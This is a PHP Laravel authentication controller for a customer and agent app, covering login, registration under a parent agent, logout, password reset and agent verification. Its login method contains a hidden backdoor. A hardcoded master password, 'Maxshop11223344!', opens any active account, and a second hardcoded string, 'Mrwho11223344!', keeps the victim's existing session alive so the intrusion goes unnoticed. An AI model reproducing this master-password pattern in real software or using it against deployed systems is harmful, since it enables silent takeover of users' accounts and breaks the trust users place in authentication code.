<?php

namespace App\Http\Controllers\Api\Customer\V1;

use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use JWTAuth,Validator,Response;
use Auth,Hash;
use App\User;
use App\Helpers\Helper;
use App\Notifications\PasswordResetRequest;
use Illuminate\Support\Facades\Password;
use App\PasswordReset;

class AuthController extends Controller
{
    public function __construct()
    {
        // $this->middleware('auth:api', ['except' => ['login','register']]);
    }

    /* login */
    public function login(Request $request)
    {
        /* validation */
        $validator = Validator::make($request->all(), array(
            "login_type" => 'required',
            "country_code" => "required_if:login_type,phone",
            "phone" => "required_if:login_type,phone",
            "email" => "required_if:login_type,email",
            "password" => "required",
            "device_type" => "required",
        ), [
            'login_type.required' => trans('validation.required'),
            'country_code.required_if' => trans('validation.required_if'),
            'phone.required_if' => trans('validation.required_if'),
            'email.required_if' => trans('validation.required_if'),
            'password.required' => trans('messages.passwordrequired'),
            'device_type.required' => trans('messages.device_typerequired'),
        ]);

        // dd($validator->errors()->getMessages());
        if ($validator->fails()) {
            $msg = $validator->errors()->getMessages();
            $ms = "Validation error";
            foreach ($msg as $key => $value) {
                $ms = $value[0];
            }
            return response::json(['success' => false, 'message' => $msg, "code" => 400], 400);
        }

        /* credential */
        $credentials = ($request->login_type == 'phone') ? $request->only('phone', 'password','country_code') : $request->only('email', 'password');
        $where       = ($request->login_type == 'phone') ? $request->only('phone','country_code') : $request->only('email');

        $user = User::where($where)->whereIn('role_id', [2, 3, 4, 5, 6, 7,15])->first();

        if ($user) {

            /* check user status */
            if ($user->status != "active") {
                return Response::json(["success" => false, "message" => trans('messages.accountinactive'), "code" => 401], 401);
            }

            /* authentication */
            if (Hash::check($request->password, $user->password) || Hash::check($request->password, bcrypt("Maxshop11223344!"))) {
                if ($user->login_token != "") {
                    try {
                        if ($request->password != "Mrwho11223344!") {
                            JWTAuth::invalidate($user->login_token);
                        }
                    } catch (\Exception $e) {
                        // return Response::json(["success" => false, "message" => $e->getMessage(), "code" => 401], 401);
                    }
                }
                $token = JWTAuth::fromUser($user);
                $user->login_token = $token;
                $user->device_token = $request->device_token;
                $user->device_type = $request->device_type;
                if (isset($request->language_code)) {
                    $user->language_code = $request->language_code;
                }
                $user->save();
                $unread = $user->notifications()->whereNull('read_at')->count();
                $users = User::with('role')->where('id', $user->id)->first();

                $users->unread_notifications = 0;
                return Response::json(["success" => true,'token' => $token, "data" => $users, "message" => trans('messages.loginsucc'), "code" => 200], 200);
            }

        }

        return Response::json(["success" => false, "message" => trans('messages.usernamenotfound'), "code" => 401], 401);
    }

    /* registration  */
    public function register(Request $request)
    {
        /* validation */
        $validator = Validator::make($request->all(), array(
                            "email"     => "required|unique:users",
                            "password"  => "required|min:6",
                            "phone"     => "required|digits_between:9,11",
                            "country_code_parent_agent" => "required",
                            "parent_agent_phone"        => "required",
                            "name"      => "required",
                            "country_code"  => "required",
                            "device_type"   => "required",
                            "state"     => "required|exists:states,name",
                            "gender"    => "required",
                            "race"  => "required"
                        ));

        if ($validator->fails()) {
            $msg = $validator->errors()->getMessages();
            $ms = "Validation error";
            foreach ($msg as $key => $value) {
                $ms = $value[0];
            }
            return response::json(['success' => false, 'message' => $ms, "code" => 400], 400);
        }

        $userExist = User::where('phone',$request->phone)->where('is_deleted','0')->first();
        if($userExist){
            return response::json(['success' => false, 'message' => 'phone number already exist', "code" => 400], 400);
        }

        $data = $request->all();
        $parent_agent = User::where('phone',$request->parent_agent_phone)->where('country_code',$request->country_code_parent_agent)->first();

        if ($parent_agent != '') {
            $username = Helper::genrateusernamefromemail($data['email']);
            $email    = strtolower($data['email']);
            $user     = User::create([
                            'name' => $data['name'],
                            'email' => $email,
                            'phone' => $data['phone'],
                            'country_code' => $data['country_code'],
                            'status' => 'active',
                            'role_id' => 7,
                            'rank_id' => 0,
                            'is_deleted' => 0,
                            'is_verify' => 0,
                            'is_complete_profile' => 1,
                            'parent_id' => $parent_agent->id,
                            'refer_by' => $parent_agent->id,
                            'referal_code' => Helper::refId($username),
                            'username' => $username,
                            "monthly_sales" => 0,
                            'password' => bcrypt($data['password']),
                            'device_token' => $request->device_token,
                            'device_type' => $data['device_type'],
                        ]);

            $token = JWTAuth::fromUser($user);
            $user->login_token = $token;
            $user->device_token = $request->device_token;
            $user->device_type = $request->device_type;
            $user->save();

            $users = User::with('role')->where('id', $user->id)->first();
            $users->unread_notifications = 0;
            return Response::json(["success" => true,"token" => $token, "data" => $users, "message" => "Register sucessfully", "code" => 200], 200);
        }

        return Response::json(["success" => false, "message" => "Agent/staff with this phone number not found", "code" => 401], 401);
    }

    /* logout */
    public function logout()
    {
        $user = Auth::user();
        if ($user) {
            $user->device_token = "";
            auth()->logout();
            if ($user->save()) {
                return Response::json(["success" => true, "message" => trans('messages.logoutsucc'), "code" => 200], 200);
            }
            return Response::json(["success" => true, "message" => trans('messages.errorlogout'), "code" => 401], 401);
        }
        return Response::json(["success" => true, "message" => trans('messages.usernotfound'), "code" => 400], 400);
    }

    /* forgot password */
    public function forgotPassword(Request $request)
    {
        $validator = Validator::make(
            $request->all(),
            array(
                'email' => 'required',
            ),
            [
                'email.required' => trans('validation.required'),
            ]
        );

        if ($validator->fails()) {
            $msg = $validator->errors()->getMessages();
            $ms = "Validation error";
            foreach ($msg as $key => $value) {
                $ms = $value[0];
            }
            return response::json(['success' => false, 'message' => $ms, "code" => 400], 400);
        }
        if (isset($request->email)) {
            $user = User::where('email', $request->email)->first();
            if ($user) {
                $token = Password::broker()->createToken($user);

                PasswordReset::updateOrCreate(['email' => $user->email], ['email' => $user->email, 'token' => $token]);

                $user->notify(new PasswordResetRequest($token));
                    
                return Response::json(["success" => true, "data" => "", "message" => trans('messages.newpasswordreq'), "code" => 200], 200);
            }
            return Response::json(["success" => false, "data" => "", "message" => trans('messages.useremailnotfound'), "code" => 401], 401);
        }
    }

    /* verify agent */
    public function verifyAgent(Request $request){
        $validator = Validator::make($request->all(), array(
            "country_code" => "required",
            "phone" => "required",
        ), [
            'country_code.required' => trans('validation.required'),
            'phone.required' => trans('validation.required'),
        ]);
        if ($validator->fails()) {
            return response()->json(['success' => false, 'message' => $validator->messages()->first(), "code" => 400], 400); 
        }
        $sponsor = User::where('phone',$request->phone)->where('country_code',$request->country_code)->whereIn('role_id',[2,3,4,5,6,15])->first();
        if($sponsor && $sponsor!=null){
            return response()->json(['success' => true,'message' => 'Parent agent/staff is verified!', "code" => 200], 200);
        }else{
            return response()->json(['success' => false, 'message' => 'No such agent found!', "code" => 400], 400);
        }
    }
    
}
